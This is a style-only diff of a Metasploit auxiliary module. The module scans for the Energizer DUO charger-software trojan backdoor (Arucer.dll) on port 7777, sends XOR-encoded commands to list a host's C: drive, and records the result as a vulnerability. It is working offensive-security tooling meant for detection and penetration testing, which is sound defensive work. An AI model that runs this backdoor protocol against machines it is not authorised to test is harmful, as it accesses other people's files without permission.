@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -27,12 +27,13 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(7777),
-      ], self.class)
+        Opt::RPORT(7777)
+      ], self.class
+    )
   end
 
   def trojan_encode(str)
-    str.unpack("C*").map{|c| c ^ 0xE5}.pack("C*")
+    str.unpack("C*").map { |c| c ^ 0xE5 }.pack("C*")
   end
 
   def trojan_command(cmd)
@@ -60,64 +61,60 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     trojan_encode(
-      [0x27].pack("V") + cid  + "\x00"
+      [0x27].pack("V") + cid + "\x00"
     )
   end
 
   def run_host(ip)
-
     begin
 
-    connect
-    sock.put(trojan_command(:dir))
-    sock.put(
-      trojan_encode(
-        [4].pack("V") + "C:\\\x00\x00"
+      connect
+      sock.put(trojan_command(:dir))
+      sock.put(
+        trojan_encode(
+          [4].pack("V") + "C:\\\x00\x00"
+        )
       )
-    )
 
-    lbuff = sock.get_once(4, 5)
-    if(not lbuff)
-      print_error("#{ip}:#{rport} UNKNOWN: No response to the directory listing request")
-      disconnect
-      return
-    end
-
-    len   = trojan_encode(lbuff).unpack("V")[0]
-    dbuff = sock.get_once(len, 30)
-    data  = trojan_encode(dbuff)
-    files = data.split("|").map do |x|
-      if x[0,2] == "?1"
-        ["D", x[2,x.length-2]]
-      else
-        ["F", x]
+      lbuff = sock.get_once(4, 5)
+      unless lbuff
+        print_error("#{ip}:#{rport} UNKNOWN: No response to the directory listing request")
+        disconnect
+        return
       end
-    end
 
-    # Required to prevent the server from spinning a loop
-    sock.put(trojan_command(:nop))
+      len   = trojan_encode(lbuff).unpack("V")[0]
+      dbuff = sock.get_once(len, 30)
+      data  = trojan_encode(dbuff)
+      files = data.split("|").map do |x|
+        if x[0, 2] == "?1"
+          ["D", x[2, x.length - 2]]
+        else
+          ["F", x]
+        end
+      end
 
-    print_status("#{ip}:#{rport} FOUND: #{files.inspect}")
-    # Add Vulnerability and Report
-    report_vuln({
-      :host  => ip,
-      :name  => "Energizer DUO USB Battery Charger Software Arucer.dll Trojaned Distribution",
-      :refs  => self.references
-    })
-    report_note(
-      :host   => ip,
-      :proto  => 'tcp',
-      :port   => datastore['RPORT'],
-      :sname  => "energizer_duo",
-      :type   => 'Energizer DUO Trojan',
-      :data   => files.inspect
-    )
-    disconnect
+      # Required to prevent the server from spinning a loop
+      sock.put(trojan_command(:nop))
+
+      print_status("#{ip}:#{rport} FOUND: #{files.inspect}")
+      # Add Vulnerability and Report
+      report_vuln(host: ip,
+                  name: "Energizer DUO USB Battery Charger Software Arucer.dll Trojaned Distribution",
+                  refs: references)
+      report_note(
+        host: ip,
+        proto: 'tcp',
+        port: datastore['RPORT'],
+        sname: "energizer_duo",
+        type: 'Energizer DUO Trojan',
+        data: files.inspect
+      )
+      disconnect
 
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Rex::ConnectionError, ::IOError
     end
-
   end
 end
